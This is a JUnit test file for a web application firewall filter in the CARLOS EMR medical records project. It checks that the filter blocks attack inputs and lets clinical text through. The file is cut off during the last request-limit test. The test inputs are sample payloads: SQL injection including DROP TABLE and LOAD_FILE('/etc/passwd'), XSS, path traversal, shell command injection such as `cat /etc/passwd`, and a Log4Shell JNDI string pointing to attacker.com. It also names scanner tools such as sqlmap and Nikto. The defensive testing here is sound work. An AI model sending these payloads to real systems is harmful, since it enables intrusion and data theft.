/**
 * Copyright (c) 2026 CARLOS Contributors. All Rights Reserved.
 *
 * This software is published under the GPL GNU General Public License.
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 *
 * CARLOS EMR Project
 * https://github.com/carlos-emr/carlos
 */
package io.github.carlos_emr.carlos.app;

import io.github.carlos_emr.CarlosProperties;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.mockito.MockedStatic;

import jakarta.servlet.FilterChain;
import jakarta.servlet.FilterConfig;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.util.Collections;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.anyInt;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.mockStatic;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * Unit tests for {@link WafFilter}.
 *
 * <p>Validates all 8 detection modules: SQL injection, XSS, path traversal, command injection,
 * CRLF header injection, scanner detection, request limits, and protocol enforcement.
 * Also validates the three-tier path model (allowlist / relaxed / hardened) and the
 * detect-vs-enforce mode toggle.</p>
 *
 * <p>Uses Mockito's {@link MockedStatic} to mock {@link CarlosProperties#getInstance()} so
 * no actual properties file is required at test runtime.</p>
 *
 * <p>All tests run in <strong>enforce mode</strong> unless stated otherwise, so violations
 * result in {@code HTTP 400} and chain.doFilter() is not called. Tests for "no violation"
 * verify that chain.doFilter() IS called and sendError() is NOT called.</p>
 *
 * @since 2026-04-05
 */
@Tag("unit")
@Tag("security")
@DisplayName("WafFilter")
class WafFilterUnitTest {

    private WafFilter filter;
    private HttpServletRequest request;
    private HttpServletResponse response;
    private FilterChain chain;

    private CarlosProperties mockProps;
    private MockedStatic<CarlosProperties> carlosPropertiesStatic;

    /**
     * Sets up a WafFilter in enforce mode with all modules enabled.
     * CarlosProperties is mocked so the filter can be initialised without a real properties file.
     */
    @BeforeEach
    void setUp() throws Exception {
        mockProps = mock(CarlosProperties.class);
        carlosPropertiesStatic = mockStatic(CarlosProperties.class);
        carlosPropertiesStatic.when(CarlosProperties::getInstance).thenReturn(mockProps);

        // WAF enabled in enforce mode — all module getProperty() calls return null → defaults (true)
        when(mockProps.getProperty("WAF_ENABLED")).thenReturn("true");
        when(mockProps.getProperty("WAF_MODE")).thenReturn("enforce");

        filter = new WafFilter();
        filter.init(mock(FilterConfig.class));

        request  = mock(HttpServletRequest.class);
        response = mock(HttpServletResponse.class);
        chain    = mock(FilterChain.class);

        // Default: POST to a regular (non-relaxed, non-hardened) endpoint
        when(request.getMethod()).thenReturn("POST");
        when(request.getRequestURI()).thenReturn("/carlos/demographic/search.do");
        when(request.getContextPath()).thenReturn("/carlos");
        when(request.getRemoteAddr()).thenReturn("127.0.0.1");
        when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0");
        when(request.getParameterNames()).thenReturn(Collections.emptyEnumeration());
        when(request.getQueryString()).thenReturn(null);
    }

    @AfterEach
    void tearDown() {
        if (carlosPropertiesStatic != null) {
            carlosPropertiesStatic.close();
        }
    }

    // =========================================================================
    // WAF Master Switch
    // =========================================================================

    @Nested
    @DisplayName("WAF master switch")
    class MasterSwitch {

        @Test
        @DisplayName("should pass through all requests when WAF is disabled")
        void shouldPassThrough_whenWafIsDisabled() throws Exception {
            // Re-init filter with WAF disabled
            when(mockProps.getProperty("WAF_ENABLED")).thenReturn("false");
            WafFilter disabledFilter = new WafFilter();
            disabledFilter.init(mock(FilterConfig.class));

            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1 UNION SELECT * FROM users"});

            disabledFilter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should log violation without blocking in detect mode")
        void shouldLogWithoutBlocking_inDetectMode() throws Exception {
            when(mockProps.getProperty("WAF_MODE")).thenReturn("detect");
            WafFilter detectFilter = new WafFilter();
            detectFilter.init(mock(FilterConfig.class));

            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1 UNION SELECT * FROM users"});

            detectFilter.doFilter(request, response, chain);

            // Detect mode: chain continues, no error response
            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }
    }

    // =========================================================================
    // SQL Injection Detection (OWASP CRS 942xxx)
    // =========================================================================

    @Nested
    @DisplayName("SQL Injection detection (942xxx)")
    class SqlInjection {

        @Test
        @DisplayName("should detect SQLi when UNION SELECT is present")
        void shouldDetectSqli_whenUnionSelect() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1 UNION SELECT * FROM users"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when tautology with comment is present")
        void shouldDetectSqli_whenTautologyWithComment() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("user")));
            when(request.getParameterValues("user")).thenReturn(new String[]{"' OR '1'='1' --"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when string tautology without comment is present")
        void shouldDetectSqli_whenStringTautologyNoComment() throws Exception {
            // Classic string tautology: ' OR 'x'='x — no trailing comment, bypassed old numeric-only pattern
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("user")));
            when(request.getParameterValues("user")).thenReturn(new String[]{"admin' OR 'x'='x"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when stacked DROP TABLE is present")
        void shouldDetectSqli_whenStackedDropTable() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1; DROP TABLE users"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when stacked UPDATE table is present")
        void shouldDetectSqli_whenStackedUpdateTable() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1; UPDATE users SET password='hacked'"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when stacked CREATE statement is present")
        void shouldDetectSqli_whenStackedCreate() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1; CREATE USER attacker"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when MySQL hash comment follows a quote")
        void shouldDetectSqli_whenMysqlHashComment() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"admin' #"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when time-based SLEEP() is present")
        void shouldDetectSqli_whenTimeBased() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1 AND SLEEP(5)"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when INTO OUTFILE is present")
        void shouldDetectSqli_whenIntoOutfile() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1 INTO OUTFILE '/tmp/x'"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when LOAD_FILE is present")
        void shouldDetectSqli_whenLoadFile() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"id=LOAD_FILE('/etc/passwd')"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect SQLi when information_schema is present")
        void shouldDetectSqli_whenInformationSchema() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(
                    new String[]{"1 AND (SELECT * FROM information_schema.tables)"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should allow clean input when medical terminology contains SELECT-ive")
        void shouldAllowCleanSql_whenMedicalTerminology() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("note")));
            when(request.getParameterValues("note")).thenReturn(
                    new String[]{"SELECT-ive serotonin reuptake inhibitor"});

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should allow clean input when OR appears in clinical context")
        void shouldAllowCleanSql_whenOrInClinicalContext() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("note")));
            when(request.getParameterValues("note")).thenReturn(
                    new String[]{"patient OR family history"});

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }
    }

    // =========================================================================
    // XSS Detection (OWASP CRS 941xxx)
    // =========================================================================

    @Nested
    @DisplayName("XSS detection (941xxx)")
    class CrossSiteScripting {

        @Test
        @DisplayName("should detect XSS when script tag is present")
        void shouldDetectXss_whenScriptTag() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("input")));
            when(request.getParameterValues("input")).thenReturn(new String[]{"<script>alert(1)</script>"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect XSS when event handler attribute is present")
        void shouldDetectXss_whenEventHandler() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("input")));
            when(request.getParameterValues("input")).thenReturn(new String[]{"<img onerror=\"alert(1)\">"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect XSS when javascript: URI is present")
        void shouldDetectXss_whenJavascriptUri() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("redirect")));
            when(request.getParameterValues("redirect")).thenReturn(new String[]{"javascript:alert(1)"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect XSS when SVG onload is present")
        void shouldDetectXss_whenSvgOnload() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("content")));
            when(request.getParameterValues("content")).thenReturn(new String[]{"<svg onload=\"alert(1)\">"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect XSS when iframe tag is present")
        void shouldDetectXss_whenIframeTag() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("content")));
            when(request.getParameterValues("content")).thenReturn(new String[]{"<iframe src=\"evil.com\">"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect XSS when data URI with text/html is present")
        void shouldDetectXss_whenDataUri() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("url")));
            when(request.getParameterValues("url")).thenReturn(new String[]{"data:text/html,<h1>XSS</h1>"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect XSS when eval() is present")
        void shouldDetectXss_whenEval() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("code")));
            when(request.getParameterValues("code")).thenReturn(new String[]{"eval(atob('YWxlcnQoMSk='))"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect XSS when tag brackets are numeric HTML entities")
        void shouldDetectXss_whenTagBracketsAreNumericEntities() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("content")));
            when(request.getParameterValues("content")).thenReturn(new String[]{"&#x3c;script&#x3e;alert(1)"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should allow benign numeric HTML entities")
        void shouldAllowXss_whenNumericHtmlEntityIsBenign() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("content")));
            when(request.getParameterValues("content")).thenReturn(new String[]{"Patient&#39;s note&#160;continued"});

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should detect XSS when vbscript: URI is present")
        void shouldDetectXss_whenVbscriptUri() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("link")));
            when(request.getParameterValues("link")).thenReturn(new String[]{"vbscript:msgbox(1)"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should allow medical onset= terminology without triggering XSS event handler rule")
        void shouldAllow_whenMedicalOnsetTerm() throws Exception {
            // 'onset=' starts with 'on' and has '=' — old broad pattern matched it; narrowed pattern does not
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("note")));
            when(request.getParameterValues("note")).thenReturn(new String[]{"onset=3 days, ongoing=yes"});

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should detect XSS when second param value contains script and first is clean")
        void shouldDetectXss_whenSecondMultiValueContainsScript() throws Exception {
            // Verifies that all values for a repeated parameter are inspected (fix for getParameter bypass)
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("input")));
            when(request.getParameterValues("input")).thenReturn(
                    new String[]{"safe value", "<script>alert(1)</script>"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }
    }

    // =========================================================================
    // Path Traversal Detection (OWASP CRS 930xxx)
    // =========================================================================

    @Nested
    @DisplayName("Path Traversal detection (930xxx)")
    class PathTraversal {

        @Test
        @DisplayName("should detect path traversal when ../ is present in param")
        void shouldDetectPathTraversal_whenDotDotSlash() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("file")));
            when(request.getParameterValues("file")).thenReturn(new String[]{"../../etc/passwd"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect path traversal when /etc/passwd is present")
        void shouldDetectPathTraversal_whenEtcPasswd() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("file")));
            when(request.getParameterValues("file")).thenReturn(new String[]{"/etc/passwd"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect path traversal when URL-encoded ../ is present")
        void shouldDetectPathTraversal_whenUrlEncoded() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("file")));
            when(request.getParameterValues("file")).thenReturn(new String[]{"%2e%2e%2fetc%2fpasswd"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect path traversal when double URL-encoded ../ is present")
        void shouldDetectPathTraversal_whenDoubleEncoded() throws Exception {
            // WafFilter.decode() will decode %252e%252e%252f → %2e%2e%2f → ../
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("file")));
            when(request.getParameterValues("file")).thenReturn(new String[]{"%252e%252e%252fetc%252fpasswd"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect path traversal when /proc/self is present")
        void shouldDetectPathTraversal_whenProcSelf() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("path")));
            when(request.getParameterValues("path")).thenReturn(new String[]{"/proc/self/environ"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect path traversal when Windows system32 path is present")
        void shouldDetectPathTraversal_whenWindowsSystem32() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("path")));
            when(request.getParameterValues("path")).thenReturn(new String[]{"C:\\windows\\system32\\cmd.exe"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }
    }

    // =========================================================================
    // Command Injection Detection (OWASP CRS 932xxx)
    // =========================================================================

    @Nested
    @DisplayName("Command Injection detection (932xxx)")
    class CommandInjection {

        @Test
        @DisplayName("should detect command injection when shell metachar + command is present")
        void shouldDetectCmdInjection_whenShellMetacharCommand() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("name")));
            when(request.getParameterValues("name")).thenReturn(new String[]{"valid; whoami"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect command injection when scripting interpreter follows metachar")
        void shouldDetectCmdInjection_whenScriptingInterpreter() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("name")));
            when(request.getParameterValues("name")).thenReturn(new String[]{"valid; python -c print(1)"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect command injection when $() subshell is present")
        void shouldDetectCmdInjection_whenSubshell() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("cmd")));
            when(request.getParameterValues("cmd")).thenReturn(new String[]{"$(id)"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect command injection when JNDI Log4Shell pattern is present")
        void shouldDetectCmdInjection_whenJndiLog4Shell() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("ua")));
            when(request.getParameterValues("ua")).thenReturn(new String[]{"${jndi:ldap://attacker.com/x}"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect command injection when backtick execution is present")
        void shouldDetectCmdInjection_whenBacktick() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("input")));
            when(request.getParameterValues("input")).thenReturn(new String[]{"`cat /etc/passwd`"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }
    }

    // =========================================================================
    // Header Injection / CRLF Detection (OWASP CRS 921xxx)
    // =========================================================================

    @Nested
    @DisplayName("Header Injection / CRLF detection (921xxx)")
    class HeaderInjection {

        @Test
        @DisplayName("should detect CRLF injection when URL-encoded CR is in param value")
        void shouldDetectCrlf_whenUrlEncodedCr() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("redirect")));
            when(request.getParameterValues("redirect")).thenReturn(new String[]{"/home%0dSet-Cookie: evil=1"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect CRLF injection when URL-encoded LF is in param value")
        void shouldDetectCrlf_whenUrlEncodedLf() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("redirect")));
            when(request.getParameterValues("redirect")).thenReturn(new String[]{"/home%0aSet-Cookie: evil=1"});

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should allow multi-line text when literal CR+LF is in param value")
        void shouldAllowMultilineText_whenLiteralCrLfInParamValue() throws Exception {
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("note")));
            when(request.getParameterValues("note")).thenReturn(new String[]{"Line one\r\nLine two"});

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should detect CRLF injection when encoded CRLF is in raw query string (not a param value)")
        void shouldDetectCrlf_whenEncodedCrLfInRawQueryString() throws Exception {
            // Simulates: GET /search.do?%0d%0aContent-Type:%20text/html
            // The CRLF is in the query string itself, not parsed as a named parameter value.
            // This tests that the CRLF check on the raw query string fires (S1 fix).
            when(request.getMethod()).thenReturn("GET");
            when(request.getQueryString()).thenReturn("%0d%0aContent-Type:%20text/html");
            when(request.getParameterNames()).thenReturn(Collections.emptyEnumeration());

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }
    }

    // =========================================================================
    // Scanner Detection (OWASP CRS 913xxx)
    // =========================================================================

    @Nested
    @DisplayName("Scanner Detection (913xxx)")
    class ScannerDetection {

        @Test
        @DisplayName("should detect scanner when sqlmap User-Agent is present")
        void shouldDetectScanner_whenSqlmapUserAgent() throws Exception {
            when(request.getHeader("User-Agent"))
                    .thenReturn("sqlmap/1.7.2#stable (https://sqlmap.org)");

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect scanner when Nikto User-Agent is present")
        void shouldDetectScanner_whenNiktoUserAgent() throws Exception {
            when(request.getHeader("User-Agent")).thenReturn("Nikto/2.1.6");

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should detect scanner when dirbuster User-Agent is present")
        void shouldDetectScanner_whenDirbusterUserAgent() throws Exception {
            when(request.getHeader("User-Agent")).thenReturn("DirBuster-1.0-RC1");

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should pass through when legitimate browser User-Agent is present")
        void shouldPassThrough_whenLegitimateUserAgent() throws Exception {
            when(request.getHeader("User-Agent"))
                    .thenReturn("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should use configured scanner user agent pattern")
        void shouldDetectScanner_withConfiguredUserAgentPattern() throws Exception {
            when(mockProps.getProperty("WAF_SCANNER_USER_AGENT_PATTERN")).thenReturn("(?i)customscanner");
            WafFilter configuredFilter = new WafFilter();
            configuredFilter.init(mock(FilterConfig.class));
            when(request.getHeader("User-Agent")).thenReturn("CustomScanner/1.0");

            configuredFilter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should fall back to default scanner pattern when configured pattern is invalid")
        void shouldFallBackToDefaultScannerPattern_whenConfiguredPatternInvalid() throws Exception {
            when(mockProps.getProperty("WAF_SCANNER_USER_AGENT_PATTERN")).thenReturn("(?i)(customscanner");
            WafFilter configuredFilter = new WafFilter();
            configuredFilter.init(mock(FilterConfig.class));
            when(request.getHeader("User-Agent")).thenReturn("sqlmap/1.7.2");

            configuredFilter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }
    }

    // =========================================================================
    // Protocol Enforcement (OWASP CRS 911xxx)
    // =========================================================================

    @Nested
    @DisplayName("Protocol Enforcement (911xxx)")
    class ProtocolEnforcement {

        @Test
        @DisplayName("should block TRACE requests")
        void shouldBlock_whenTraceMethod() throws Exception {
            when(request.getMethod()).thenReturn("TRACE");

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should block TRACK requests")
        void shouldBlock_whenTrackMethod() throws Exception {
            when(request.getMethod()).thenReturn("TRACK");

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should block configured HTTP methods")
        void shouldBlock_whenMethodIsConfigured() throws Exception {
            when(mockProps.getProperty("WAF_BLOCKED_METHODS")).thenReturn("TRACE,OPTIONS");
            WafFilter configuredFilter = new WafFilter();
            configuredFilter.init(mock(FilterConfig.class));
            when(request.getMethod()).thenReturn("OPTIONS");

            configuredFilter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should allow TRACK when configured blocked methods omit it")
        void shouldAllowTrack_whenConfiguredBlockedMethodsOmitIt() throws Exception {
            when(mockProps.getProperty("WAF_BLOCKED_METHODS")).thenReturn("TRACE");
            WafFilter configuredFilter = new WafFilter();
            configuredFilter.init(mock(FilterConfig.class));
            when(request.getMethod()).thenReturn("TRACK");

            configuredFilter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should pass through GET requests")
        void shouldPassThrough_forGetRequests() throws Exception {
            when(request.getMethod()).thenReturn("GET");

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should pass through POST requests")
        void shouldPassThrough_forPostRequests() throws Exception {
            when(request.getMethod()).thenReturn("POST");

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }
    }

    // =========================================================================
    // Request Limits (OWASP CRS 920xxx)
    // =========================================================================

    @Nested
    @DisplayName("Request Limits (920xxx)")
    class RequestLimits {

        @Test
        @DisplayName("should block when URI path + query string exceeds max length")
        void shouldBlock_whenUriTooLong() throws Exception {
            // Per Servlet spec, getRequestURI() returns only the path (no query string).
            // A long query string must also be counted — test verifies the combined check.
            when(request.getRequestURI()).thenReturn("/carlos/search.do");
            when(request.getQueryString()).thenReturn("a".repeat(2100));
            when(request.getMethod()).thenReturn("GET");

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should block on hardened path when parameter count exceeds hardened limit")
        void shouldBlock_whenTooManyParamsOnHardenedPath() throws Exception {
            when(request.getRequestURI()).thenReturn("/carlos/login.do");

            // Return 11 parameter names (hardened limit default is 10)
            java.util.List<String> params = new java.util.ArrayList<>();
            for (int i = 0; i < 11; i++) {
                params.add("param" + i);
            }
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(params));
            for (String p : params) {
                when(request.getParameterValues(p)).thenReturn(new String[]{"value"});
            }

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should count repeated parameter values toward parameter limit")
        void shouldBlock_whenRepeatedParameterValuesExceedLimit() throws Exception {
            when(request.getRequestURI()).thenReturn("/carlos/login.do");
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("param")));
            when(request.getParameterValues("param")).thenReturn(
                    new String[]{"v1", "v2", "v3", "v4", "v5", "v6", "v7", "v8", "v9", "v10", "v11"});

            filter.doFilter(request, response, chain);

